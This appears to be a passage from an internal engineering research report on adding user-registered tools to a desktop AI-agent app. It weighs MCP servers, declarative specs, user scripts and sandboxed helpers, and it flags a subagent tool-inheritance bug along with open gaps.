Consequence: **a default-configuration Session's child Subagent session sees 17 of its parent's 26 tools and none of the seven board verbs**, while a parent with an *explicitly restrictive* list that *names* a host verb does pass it down (`archimedes:src-tauri/tests/worker_e2e.rs:3361` → child `["write_artifact"]`, asserted at `:3415-3424`). **The less restrictive setting produces the narrower child.**

The envelope hop itself is fine and pinned (`a_child_worker_inherits_the_parents_host_tools`); the loss is in the *filter list*. It is not advertised-and-dead (the filter removes it from advertising too), **ADR 0102 §2.3 and its amendment do not name it**, and `the_enabled_tools_wire_convention_is_applied_verbatim` exercises only `Some(["subagent"])` and `Some(["bash","read"])` — never an empty parent with host tools. **Independent of registration; belongs on its own card.**

#### The pattern to copy for a listing surface

Skills and Agent definitions are **sidebar modals** mounted by `SpacesList`, not Settings sections; MCP is a Settings section. The copyable shape is `SkillsDialog`'s `CatalogSearchDialog`: rows + substring search + a three-state empty message; a per-row state badge whose tooltip names **both** freshness timings; **an inert row that says why in a visible second line rather than a tooltip** (because an inert row cannot be focused, so a tooltip would be mouse-only); and an **error block as a sibling of the list, never a row** — gated on its own condition so it cannot ride an empty state, plain text so it is never a button that loads a different file, filtered by the same search needle so it cannot contradict the list above it, and headed with the *winner's* scope because the loser's is false in shipped configs. MCP contributes the one "your thing is broken, here is why" affordance Settings has today: a per-row **Test** button with an inline result badge (`{n} tools` / `needs auth` / `error`) and the IPC error text in the tooltip.

### F6 — Where the work lands

**Ground truth on the two repos, verified before relying on it:** the root workspace has one member; `src-tauri/Cargo.toml:145` pins `fulcrum-harness = "0.8.0"`; `Cargo.lock:1665-1668` resolves to `source = "registry+"` with a checksum; `.cargo/config.toml` is **absent** (only the `.example`); no `[[patch.unused]]`. The sibling checkout is at the peeled `v0.8.0` tag, clean, and `diff -rq` against the published `src/` is empty.

| Registration kind | Desktop-only? | Crate change? | Publish + pin? | Protocol? | Frontend? | Cost |
|---|---|---|---|---|---|---|
| **(a) Spec + executor over existing desktop state** (a new `Db` verb — the card-#44 shape) | **Yes** | No | No | No | Only if it emits a new `details` key; `details: None` → zero | **1 commit**: one `ToolSpec`, one `match` arm, one `Db` verb, three censuses. Settings + `enabled_tools` free |
| **(a′) The same declared in `tools/*.json`** | Yes for the **spec** half | No | No | No | Same | Spec half free (`Deserialize`, no new type). **The executor half cannot be declared** → advertised-and-dead without a shipped arm |
| **(b) A user script** | **No — nothing to reuse** | Not strictly required, but the only engine is crate-side and runs in the **Worker**, not the Supervisor | Only to extend the crate's engine (a new `ToolCtx`/registry capability = ≥ minor) | No | If it wants a rich card | **A new subsystem.** Desktop `rquickjs` is declared at `src-tauri/Cargo.toml:232` with ~26 lines of rationale and **0 source hits** (verified); no `tauri-plugin-shell`, no `shell:*`; `sudo_exec`/MCP/`codemode` are all crate- and Worker-side |
| **(c) External process / server via MCP** | **Yes** | No | No | No | No | **Zero code.** A *generic* "spawn this command, JSON on stdin" path **does not exist**; building it means the desktop's first raw `Command::new` outside the ADR 0060 `childproc` census, whose invariants scan the **crate's** `src/`, not the desktop's |
| *(ref) A new engine-side tool* | No | **Yes** | **Yes** — hand-run `cargo publish`, **irreversible** | No | If it emits `details` | 5 steps, 2 repos, ~1800 crate tests unrunnable locally |

#### (b) There is no script or generic-process executor to reuse — all four candidates fail

| Candidate | Why not |
|---|---|
| `codemode` / `rquickjs` | Declared in the desktop's `Cargo.toml`, **zero source hits** — vestigial. The engine is ADR 0089's and lives in the **crate** (`fulcrum:src/codemode/engine.rs`); the bridge resolves nested calls through the **Worker's** registry, i.e. not in the process that answers a Host tool |
| `sudo_exec` | Crate-side, **loop-internal**, excluded from scripts; it spawns `sudo -S`, not an interpreter |
| MCP stdio spawn | Crate-side, inside the Worker's `McpManager`; unreachable from a desktop executor |
| Tauri shell plugin | **Not installed**; `commands/update.rs:11` records the deliberate choice ("a plain `std::process::Command` in Rust, so no `shell:allow-*`") |

#### (b′) A second constraint on Tier 2's shape

`exec::run(db, tool, params)` takes `&Arc<Db>` **and nothing else** — no `AppHandle`, no session identity, no `SessionManager`. The router *holds* an `AppHandle` (`session/mod.rs:775`) and does not pass it down. So an alias over an existing **Tauri command** needs either a threaded handle or a re-implementation against the `Db` layer; and any verb whose subject is *the calling session* needs an identity parameter (card #44's plan does exactly that, threading `origin` + `is_subagent`, and rejects a generic `update_session` verb for this reason).

#### The two-repo ceremony, if any tier ever needs it

Documented in five places, most completely at `archimedes:docs/research/edit-task-cannot-clear-a-field.md:205-224`, with a shipped worked example (0.4.1 → 0.4.2: engine PR #31, annotated tag, hand-published, then desktop PR #208, and `Cargo.lock` moved **only** that crate's version and checksum). The steps: engine gates → version in **three** engine files → annotated tag → **`cargo publish -p fulcrum-harness` by hand** (bare `cargo publish` refuses; the daemon member is `publish = false`; crates.io supports neither rename nor delete; verify the extracted `.crate` **outside** any repo or five `childproc` tests false-fail) → desktop pin bump + `cargo update` + the router arm **in the same commit** → the full desktop bar.

Two things that do **not** move: `@tauri-apps/cli` (its pin rule fires on a **`tauri`** version change, and 0.8.0's manifest has no `tauri` dependency), and `PROTOCOL_VERSION`. `check-versions.sh` reads the **app** version — a different axis.

**The engine is not frozen.** Card #13's status artifact says `main` was "published and frozen **for this run**" and its follow-ups repeat that reversing it is "a 0.9.0 decision, not a stray commit"; ADR 0102's amendment carries the same sentence. That run closed 2026-11-25 with 0.8.0 published, so **the freeze was run-scoped and has expired** — it is not a repo policy. The live run keeps the crate read-only anyway (card #44: `fulcrum-harness = "0.8.0" (read-only)`, and a gate that "`Cargo.lock` must not move"). And the pin is a **caret**, so a `0.8.x` patch is a lockfile touch while any **minor** is the full ceremony. Cards #45 and #46 are both parked at research precisely because they are ≥0.9.0 crate work.

#### Protocol: nothing

`PROTOCOL_VERSION: u32 = 1` bumps only on a **breaking** frame shape; an additive frame does not bump it. The pair is vocabulary-free — `tool: String`, and the `Err` half is a bare `String` because "naming an error type here would put host vocabulary back into the engine." There is no per-tool allow-list anywhere on the wire; the only name allow-list is frame *types*. And the Worker is a self-exec of the same binary, so **wire skew is unrepresentable**. Adding fifty tool names touches it zero times. Pinned by `the_host_tool_frames_are_additive_so_the_protocol_version_stays_one`.

#### Nothing in either tree anticipates this

`fulcrum` has zero hits for `register_tool` / `custom tool` / `user tool` / a plugin trait (every `registration` hit is **OAuth client registration**, every `plugin` hit is `linuxdeploy-plugin-gtk`), zero `TODO`/`FIXME` in `registry.rs`, `host_tools.rs`, `worker_types.rs` or `launch.rs`, and — notably — **`fulcrum/docs`, `README.md` and `AGENTS.md` contain zero mentions of `host_tools`**: the engine's own durable docs do not mention the seam it shipped. `set_tool_registry` / `builtins()` / `host_entries()` / `ToolExecutor` are all `pub` and fully usable by a Rust host that builds the loop in-process, but **the desktop never builds an `AgentLoop`** (`grep 'AgentLoop::new' src-tauri/src` → 0; its only entry is `run_worker(open_requester, install_crash_hook)` — two parameters, neither a registry). So the executor half of the injection API has **no production caller**, which is precisely the "a trait with no caller has no runtime behaviour to test" shape `fulcrum:src/seams.rs` warns about and the reason ADR 0102 rejected "Registry as an appendix."

---

## Recommendation

**Decline "pick a mechanism." Ship a tier split, because the three kinds are three different trust postures that happen to share a word.**

1. **Tier 1 — accept MCP as the registration mechanism for external-capability tools, and ship five small fixes rather than a feature.**
   (i) A **`disabled` toggle** on the MCP row — ~15–25 lines of TSX for a feature the engine already honours end to end and the wire type already declares. Do **not** touch `enabled_tools`; putting servers in the tool checkbox list would create checkboxes `enabled_tools` cannot honour, which is the advertised-and-dead class.
   (ii) Copy that a new/edited server applies **next session**.
   (iii) Fix **`CONTEXT.md:77`** — it says the Worker reads `settings.json` in-process for `mcpServers`; that is false since Fulcrum T3 (the map rides the `StartEnv`; only pi's two files are read from disk, enforced by a source-scan pin).
   (iv) Record the four invisibility consequences in `docs/features/mcp-known-gaps.md` — the file that survives ship, and where none of them currently appears.
   (v) Optional: surface `annotations` as a **badge only** — the spec itself forbids using them for decisions.
2. **Tier 2 — the real feature is declarative specs from disk whose executor is a *name the desktop already implements*.** Not user code: an **allowlist of host-implemented dispatch targets**, which is exactly the property that keeps the frozen-`ToolCtx` invariant intact. Desktop-only, one repo, no publish, no protocol change. It needs a dispatch discriminator that `ToolSpec` cannot carry (§F1) — either a fourth field on a desktop-side registration record, or a sidecar mapping name → target.
3. **Prerequisite for Tier 2: make a dropped or dead tool visible to the person who registered it** (§F5a). No plumbing exists today. Adopt the **agents** honesty standard (announce), not the skills standard (skip silently).
4. **Tier 3 — decline the user script for now, and say why in an ADR.** It is not defensible at shipped defaults without four named gate changes — a **script-scoped narrowing** (a script must not inherit `Allow`), **gating `mcp` and the web tools for scripts**, **killing the `proxy` override for script calls**, and a **call budget** — and even then its ceiling is "the Worker is lost," which holds the provider keys and the user's file permissions. ADR-worthy: hard to reverse, surprising without context, and a real trade-off against the only product in the market that did ship it.
5. **Tier 4 — if the third-party case ever becomes real, it is a confined helper process** with a tainted return boundary, where Linux is ~90% built and Windows is a project. Do not start this from this card.
6. **Split the §F5(d) child-tools defect to its own card.** It is a live bug on shipped behaviour, it has a test gap, and it is not a registration question.

---

## Evidence

### Method

Six parallel researcher leaves, one angle each, dispatched from one response; four local-code, one web prior-art, one web security. The synthesiser then **personally re-verified** the three highest-stakes claims rather than trusting the reports: `POLICIED_TOOLS`' seven names, the `subagent_flow.rs:830-842` child-tools branch and the `dispatch.rs:346` derivation that makes it fire by default, and `rquickjs-sys/build.rs:143`'s four compiled sources with `grep -c quickjs-libc` → 0. Two further claims were verified by direct measurement: `toolDetailsRegistry.ts` **does not exist** as a module (only the `.test.ts` census, which has no runtime subject), and the desktop's `rquickjs` dependency has **zero** source hits.

### Local primary sources

`fulcrum-harness 0.8.0`: `worker_types.rs` (`StartEnv::host_tools`), `worker/core.rs` (`default_build_loop`), `worker/host_tools.rs`, `worker/protocol.rs`, `worker/manager/{mod,pump,subagent_flow}.rs`, `tools/exec/registry.rs`, `harness/{loop.rs,launch.rs,prompt.rs,dispatch.rs}`, `harness/loop/{tools,gate,turn,codemode}.rs`, `harness/tool_specs.rs`, `mcp/{config,manager,tool,types,stdio,http,oauth}.rs`, `codemode/engine.rs`, `provider_types.rs`, `definition_permission.rs`, `policy.rs`, `sandbox.rs`, `web/net.rs`, `skills.rs`, `agents.rs`, `diagnostics.rs`, `dispatch.rs`, `boundary_pins.rs`, `Cargo.toml`.
`archimedes`: `agent/host_tools/{mod,specs,exec}.rs` + `tests/{surface,verbs,shape,mapping}.rs`, `agent/session/{mod,router}.rs`, `commands/{settings,mcp,skills,open,update}.rs`, `config.rs`, `lib.rs`, `storage/db/spaces.rs`, `src/lib/{toolOutput.ts,toolDetailsRegistry.test.ts}`, `src/lib/tauri/types.ts`, `src/components/{settings/{GeneralSection,McpSection,PermissionsSection}.tsx,agents/PermissionReport.tsx,SkillsDialog.tsx,ToolCallCardHeader.tsx,MessageBubble.tsx}`, `src-tauri/capabilities/default.json`, `rquickjs-sys-0.14.0/build.rs`, `rquickjs-sys-0.14.0/quickjs/SECURITY.md`.
ADRs read: 0010, 0013, 0016, 0017, 0018, 0019, 0020, 0025, 0029, 0030, 0060, 0065, 0067, 0081, 0083, 0084, 0089, 0091, 0092, 0098, 0102 (including its 2026-11-25 amendment). Feature docs: `permissions-model.md`, `codemode.md`, `codemode-known-gaps.md`, `mcp-known-gaps.md`, `task-board-known-gaps.md`, `session-ready-marker.md`, `supervisor-log-diagnostics.md`.

### Web primary sources (credibility: official docs first)

**Prior art.** Claude Code [plugins/overview](https://code.claude.com/docs/en/plugins/overview) · [plugins/security](https://code.claude.com/docs/en/plugins/security) · [manifest reference](https://code.claude.com/docs/en/plugins/manifest-reference) · [MCP](https://code.claude.com/docs/en/mcp) · [hooks](https://code.claude.com/docs/en/hooks) · [skills](https://code.claude.com/docs/en/skills) · [sub-agents](https://code.claude.com/docs/en/sub-agents). OpenCode [plugins](https://opencode.ai/docs/build/plugins) · [server plugins](https://opencode.ai/docs/build/plugins/server) · [migrate-v1](https://opencode.ai/docs/build/plugins/migrate-v1) · [permissions](https://opencode.ai/docs/permissions) · [`tool.ts` @ v1.19.6](https://github.com/sst/opencode/blob/v1.19.6/packages/plugin/src/tool.ts) · [`loader.ts` @ v1.19.6](https://github.com/sst/opencode/blob/v1.19.6/packages/plugin/src/loader.ts). Cursor [MCP](https://cursor.com/help/customization/mcp) · [permissions.json](https://cursor.com/docs/reference/permissions) · [plugins](https://cursor.com/docs/plugins) · [marketplace security](https://cursor.com/help/security-and-privacy/marketplace-security) · [Agent Plugins spec](https://github.com/agentplugins/agent-plugins-spec). Windsurf [Cascade MCP](https://docs.devin.ai/windsurf/plugins/cascade/mcp) · Cline [mcp-overview](https://docs.cline.bot/mcp/mcp-overview) · Continue [MCP](https://docs.continue.dev/customize/deep-dives/mcp). VS Code [extension runtime security](https://code.visualstudio.com/docs/editor/extension-runtime-security) · [workspace trust](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) · [activation events](https://code.visualstudio.com/api/references/activation-events) · [Language Model Tool API](https://code.visualstudio.com/api/extension-guides/ai/tools) · [Marketplace trust](https://devblogs.microsoft.com/blog/security-and-trust-in-visual-studio-marketplace) · [RemovedPackages.md](https://github.com/microsoft/vsmarketplace/blob/main/RemovedPackages.md). Obsidian [community plugins](https://github.com/obsidianmd/obsidian-help/blob/master/en/Extending%20Obsidian/Community%20plugins.md) · [plugin security](https://github.com/obsidianmd/obsidian-help/blob/master/en/Extending%20Obsidian/Plugin%20security.md) · [submission requirements](https://github.com/obsidianmd/obsidian-developer-docs/en/Community%20directory/Submission%20requirements%20for%20plugins.md). Declarative end: [Anthropic tool use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview) · [OpenAI function calling](https://platform.openai.com/docs/guides/function-calling) · [Gemini function calling](https://ai.google.dev/gemini-api/docs/function-calling) · [OpenAI plugins](https://developers.openai.com/plugins/concepts/plugins) · [Codex hooks](https://developers.openai.com/codex/hooks) · [MCP security best practices](https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices) · [MCP ToolAnnotations schema](https://modelcontextprotocol.io/specification/2025-06-18/schema#toolannotations).

**Security.** QuickJS-NG `SECURITY.md` (vendored in this exact build — the highest-credibility source available for QuickJS's own threat model) · NebuSec, *Lessons from Telegram's RCE* <https://nebusec.ai/research/telegram-widget-hardening> · NVD keyword `quickjs` (33 CVEs) and OSS-Fuzz via OSV (31) · SurrealDB GHSA-XX7M-69FF-9CRP · crates.io API for every engine candidate · OpenAI, *Building a safe, effective sandbox to enable Codex on Windows* <https://openai.com/index/building-codex-windows-sandbox> · Apple App Sandbox docs + Developer Forums on child-sandbox inheritance · Ubuntu AppArmor userns restriction <https://discourse.ubuntu.com/t/understanding-apparmor-user-namespace-restriction/58007>, Launchpad #2162115, openai/codex#14919 · Tauri 2 security docs: [/security/](https://v2.tauri.app/security/), `/security/capabilities/`, `/security/runtime-authority/`, `/start/migrate/from-tauri-1/` · Simon Willison, *The lethal trifecta* <https://simonwillison.net/2025/Jun/16/the-lethal-trifecta> · arXiv 2603.22489, *MCP Threat Modeling*.

### Fact / inference / speculation

**Verified** — everything cited to a local path above, all web quotes above, the crates.io release dates and download counts, the NVD/OSS-Fuzz totals.
**Reasonable inference (multi-source)** — that the market's convergence on the external server is *caused* by the host-never-runs-user-code property (supported by every product's own stated rationale, but a causal reading); that a script-scoped narrowing plus gating `mcp`/web would make Tier 3 *defensible* though not *contained*.
**Single-source or mechanism-only, flagged as such** — the `web_search` `proxy` exfiltration path (mechanism code-verified end to end, **not** tested as an exploit); the macOS claim that a `sandbox-exec`-wrapped helper is "the pragmatic path everyone takes" (from vendor docs + one forum thread, no controlled measurement); the Windows ceiling being "write restriction only" (OpenAI's experience, not ours).
**Speculation** — none in the recommendation. Nothing here estimates an install base, demand, or adoption.

---

## Unresolved contradictions

1. **"MCP is sufficient with small fixes" vs "MCP is the only real boundary and the most work."** Both were reported, by different angles, and they are not in conflict: they are different axes. MCP is the **lowest-friction** registration and simultaneously the **weakest** gate, because it is a second process the policy layer cannot address by name. Resolved by the §F2 split — external substance ⇒ fine; host-mutating substance ⇒ wrong vehicle. Recorded here because a reader who meets only one half of it will draw the wrong conclusion.
2. **Whether the engine repo would accept a fourth `ToolSpec` field.** No conversation has happened. ADR 0102's freeze was run-scoped and expired, but #45 and #46 are both parked at research precisely because they are ≥0.9.0 crate work. "A minor bump is the full ceremony" is documented, not negotiated. **Verify with the engine's maintainers before planning anything that assumes it.**
3. **The `read`/`subagent` substring ban's stated justification appears stale.** One researcher reports that the `worker_e2e.rs` substring assertion it exists to protect was replaced by the enumerated-name `assert_advertised_tools`, so only a comment still contains the substring form — meaning the ban still runs and the CI-weakening it guards against no longer exists. **Researcher-reported; the synthesiser did not re-verify this**, and it is not load-bearing for any recommendation here.
4. **Whether the seven host verbs' write-floor story is what a user tool wants.** The write floor refuses writes into the four agent-definition dirs in every policy, "never widened by Trust," and ADR 0030 calls it "a guard-rail, not a security boundary." If Tier 2 tools can write host state, the guard-rail/boundary distinction stops being a footnote. Not resolved here.

## Gaps

- **No demand measurement exists, and the card's own provenance is a deferral-scope statement.** "The tools that were deferred… are kind of a big deal" is about the *previous* run's scope, not a user request for extensibility. No measurement of how often anyone hits this. **Any plan should say what it is for.**
- **No third-party distribution story was designed, only surveyed.** Signing, a registry, sandboxed dynamic analysis, and force-uninstall are VS Code/Obsidian-scale institutions; nothing here sizes them for this project.
- **`narrow` and `ToolKey` remain crate-side and blind to host tools** (cards #45, #46). Any Tier 2 inherits both: a registered tool **cannot be narrowed or denied by an agent definition**, which is a real limit on what "permission" can mean for it.
- **Whether `scripts/check-file-size.sh` and `check-commands.sh` pass with an eighth spec + arm** was read statically (both files well under gate, no ledger entries, host verbs absent from the command registry) but **not executed**.
- **The four open MCP OAuth residuals in `docs/features/mcp-known-gaps.md`** (`last-verified: 2026-10-29`) were not re-verified. If Tier 1 is the answer for a whole class of tools, that file's honesty is load-bearing — re-read it before promising anyone that a user-added HTTP+OAuth server works.
- **No measurement of what a rich `details` reader costs** for a registered tool beyond "five coupled edits." The 39-vs-34-key divergence between the frontend's frozen tuple and the crate's copy is acknowledged by both files and measured by neither.

## What supersedes what

Nothing. This report is the first durable record on this question; there is no prior `docs/research/` document on tool registration, and ADR 0102's own §5 explicitly placed it out of scope rather than deciding it. Two of its statements are now stale in a way this report corrects: `docs/research/keenable-as-a-search-provider.md:290-292` says "the sanctioned mechanism exists on paper and is not built" — it shipped in 0.8.0 — and `CONTEXT.md:77` mis-states the `mcpServers` read mechanism (§F2, fix (iii)).
